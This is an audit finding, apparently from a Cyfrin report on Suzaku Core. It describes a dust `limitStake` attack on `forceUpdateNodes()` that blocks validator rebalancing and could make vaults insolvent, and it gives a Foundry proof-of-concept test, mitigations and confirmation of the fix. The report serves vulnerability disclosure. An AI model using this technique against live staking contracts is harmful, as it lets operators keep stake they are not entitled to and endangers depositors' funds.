---
tags:
  - lang/solidity
  - sector/staking
  - platform/cyfrin
  - has/github
  - severity/high
protocol: "[[Suzaku Core]]"
auditors:
  - 0kage
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-07-cyfrin-suzaku-core-v2.0.md"
genome:
  - "[[dos-resistance]]"
  - "[[precision-loss]]"
  - "[[variant]]"
  - "[[math-is-safe]]"
  - "[[fix-arithmetic]]"
---
# Dust limit attack on `forceUpdateNodes` allows DoS of rebalancing and potential vault insolvency

- id: 61229
- impact: HIGH
- protocol: Suzaku Core
- reporter: 0kage (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-07-cyfrin-suzaku-core-v2.0.md

## Summary


The bug report describes a vulnerability in the `forceUpdateNodes()` function that can be exploited by an attacker. By using a small `limitStake` value, the attacker can force all validator nodes into a pending update state, effectively blocking legitimate rebalancing for the entire epoch. This can lead to operators retaining more stake than they are entitled to, and in extreme cases, could result in the protocol becoming insolvent. The report includes a proof of concept and recommends mitigations such as preventing updates when the resulting P-Chain weight would be identical and setting a minimum `limitStake` value. The bug has been fixed in the Suzaku codebase and verified by Cyfrin.

## Details

**Description:** An attacker can exploit the `forceUpdateNodes()` function with minimal `limitStake` values to force all validator nodes into a pending update state. By exploiting precision loss in stake-to-weight conversion, an attacker can call `forceUpdateNodes` with a minimal limitStake (e.g., 1 wei), which sets the rebalancing flag without actually reducing any stake, effectively blocking legitimate rebalancing for the entire epoch.

Consider following scenario:
- Large vault undelegation requests reducing vault active state -> this creates excess stake that needs to be rebalanced
- Attacker calls `forceUpdateNodes(operator, dustAmount)` with `dustAmount` (1 wei)
- Minimal stake (≤ 1 wei) is "removed" from all available nodes
- Due to WEIGHT_SCALE_FACTOR precision, the actual weight sent to P-Chain doesn't change, but P-Chain still processes the update. Effectively, we are processing a non-update.
- The node is marked as `nodePendingUpdate[validationID] = true`
- All subsequent legitimate rebalancing attempts in the same epoch revert

`forceUpdateNodes()` is callable by anyone during the final window of each epoch and `limitStake` has no minimum bound check.

**Impact:**
- Operators with excess stake can exploit this to retain more stake than entitled
- Attackers can systematically prevent rebalancing for any operator in every epoch
- Blocked rebalancing means operator nodes retain stake that should be liquid in vaults. If multiple large withdrawals occur, we could end up in a protocol insolvency state when `vault liquid assets < pending withdrawal requests`

**Proof of Concept:** Copy the test in `AvalancheMiddlewarTest.t.sol`

```solidity
    function test_DustLimitStakeCausesFakeRebalancing() public {
        address attacker = makeAddr("attacker");
        address delegatedStaker = makeAddr("delegatedStaker");

         uint48 epoch0 = _calcAndWarpOneEpoch();

        // Step 1. First, give Alice a large allocation and create nodes
        uint256 initialDeposit = 1000 ether;
        (uint256 depositAmount, uint256 initialShares) = _deposit(delegatedStaker, initialDeposit);
        console2.log("Initial deposit:", depositAmount);
        console2.log("Initial shares:", initialShares);

         // Set large L1 limit and give Alice all the shares initially
        _setL1Limit(bob, validatorManagerAddress, assetClassId, depositAmount, delegator);
        _setOperatorL1Shares(bob, validatorManagerAddress, assetClassId, alice, initialShares, delegator);

        // Step 2. Create nodes that will use this stake
        // move to next epoch
        uint48 epoch1 = _calcAndWarpOneEpoch();
        (bytes32[] memory nodeIds, bytes32[] memory validationIDs,) =
            _createAndConfirmNodes(alice, 2, 0, true);

        uint48 epoch2 = _calcAndWarpOneEpoch();

        // Verify nodes have the stake
        uint256 totalNodeStake = 0;
        for (uint i = 0; i < validationIDs.length; i++) {
            uint256 nodeStake = middleware.getNodeStake(epoch2, validationIDs[i]);
            totalNodeStake += nodeStake;
            console2.log("Node", i, "stake:", nodeStake);
        }
        console2.log("Total stake in nodes:", totalNodeStake);

        uint256 operatorTotalStake = middleware.getOperatorStake(alice, epoch2, assetClassId);
        uint256 operatorUsedStake = middleware.getOperatorUsedStakeCached(alice);
        console2.log("Operator total stake (from delegation):", operatorTotalStake);
        console2.log("Operator used stake (in nodes):", operatorUsedStake);

        // Step 3. Delegated staker withdraws, reducing Alice's available stake
        console2.log("\n--- Delegated staker withdrawing 60% ---");
        uint256 withdrawAmount = (initialDeposit * 60) / 100; // 600 ether

        vm.startPrank(delegatedStaker);
        (uint256 burnedShares, uint256 withdrawalShares) = vault.withdraw(delegatedStaker, withdrawAmount);
        vm.stopPrank();

        console2.log("Withdrawn amount:", withdrawAmount);
        console2.log("Burned shares:", burnedShares);
        console2.log("Remaining shares for Alice:", initialShares - burnedShares);

         // Step 4. Reduce Alice's operator shares to reflect the withdrawal
        uint256 newOperatorShares = initialShares - burnedShares;
        _setOperatorL1Shares(bob, validatorManagerAddress, assetClassId, alice, newOperatorShares, delegator);


        console2.log("Updated Alice's operator shares to:", newOperatorShares);

        // Step 5. Move to next epoch - this creates the imbalance
        uint48 epoch3  = _calcAndWarpOneEpoch();

        uint256 newOperatorTotalStake = middleware.getOperatorStake(alice, epoch3, assetClassId);
        uint256 currentUsedStake = middleware.getOperatorUsedStakeCached(alice);

        console2.log("\n--- After withdrawal (imbalance created) ---");
        console2.log("Alice's new total stake (reduced):", newOperatorTotalStake);
        console2.log("Alice's used stake (still in nodes):", currentUsedStake);

        // Step 6. Attacker prevents legitimate rebalancing
        console2.log("\n--- ATTACKER PREVENTS REBALANCING ---");

        // Move to final window where forceUpdateNodes can be called
        _warpToLastHourOfCurrentEpoch();

        // Attacker front-runs with dust limitStake attack
        console2.log("Attacker executing dust forceUpdateNodes...");
        vm.prank(attacker);
        middleware.forceUpdateNodes(alice, 1); // 1 wei - minimal removal

        // Check if any meaningful stake was actually removed
        uint256 stakeAfterDustAttack = middleware.getOperatorUsedStakeCached(alice);
        console2.log("Used stake after dust attack:", stakeAfterDustAttack);

        uint256 actualRemoved = currentUsedStake > stakeAfterDustAttack ?
            currentUsedStake - stakeAfterDustAttack : 0;
        console2.log("Stake actually removed by dust attack:", actualRemoved);

       // The key issue: minimal stake removed, but still excess remains
        uint256 remainingExcess = stakeAfterDustAttack > newOperatorTotalStake ?
            stakeAfterDustAttack - newOperatorTotalStake : 0;
        console2.log("REMAINING EXCESS after dust attack:", remainingExcess);

        // 7. Try legitimate rebalancing - should be blocked
        console2.log("\n--- Attempting legitimate rebalancing ---");
        vm.expectRevert(); // Should revert with AvalancheL1Middleware__AlreadyRebalanced
        middleware.forceUpdateNodes(alice, 0); // Proper rebalancing with no limit
        console2.log(" Legitimate rebalancing blocked by AlreadyRebalanced");
    }
```

**Recommended Mitigation:**
- Consider preventing updates when the resulting P-Chain weight would be identical
- Consider setting a minimum on `limitStake` so that all left over stake is absorbed by the remaining active nodes. For eg.

```text
Leftover stake to remove: 100 ETH
Active nodes that can be reduced: 10 nodes
Minimum required limitStake: 100 ETH ÷ 10 nodes = 10 ETH per node
```
Any value less than this minimum would mean that operators can retain more stake than they should.

**Suzaku:**
Fixed in commit [ee2bdd5](https://github.com/suzaku-network/suzaku-core/pull/155/commits/ee2bdd544a2705e9f10bd250ad40555f115b11cb).

**Cyfrin:** Verified.
